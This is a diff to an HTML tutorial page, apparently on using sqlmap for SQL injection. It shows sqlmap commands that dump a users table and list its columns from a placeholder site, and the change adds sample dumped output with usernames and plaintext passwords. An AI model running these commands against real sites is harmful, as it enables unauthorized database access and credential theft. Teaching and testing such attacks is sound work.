@@ -280,7 +280,18 @@ To extract the content of a specific table, we will enter the database with -D a
 
 <div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -dump</div><br>
 
-Now we have the content of the users table. If we want, we can go further and extract only a specific column or certain columns from the table using the "-columns" option, and then, after we have it, entering them with -C option and retrive it with -dump.<br><br>
+Now we have the content of the users table. <br><br>
+
+<div class="code-box2">+-----------------------------------------------------------------+
+ | id |username | password | city |
+ | 1 | john_doe | password123 | New York |
+ | 2 | jane_smith | qwerty456 | Los Angeles |
+ | 3 | mike_jones | letmein789 | Chicago |
++-----------------------------------------------------------------+</div><br>
+
+
+
+If we want, we can go further and extract only a specific column or certain columns from the table using the "-columns" option, and then, after we have it, entering them with -C option and retrive it with -dump.<br><br>
 
 <div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -columns</div><br>
 
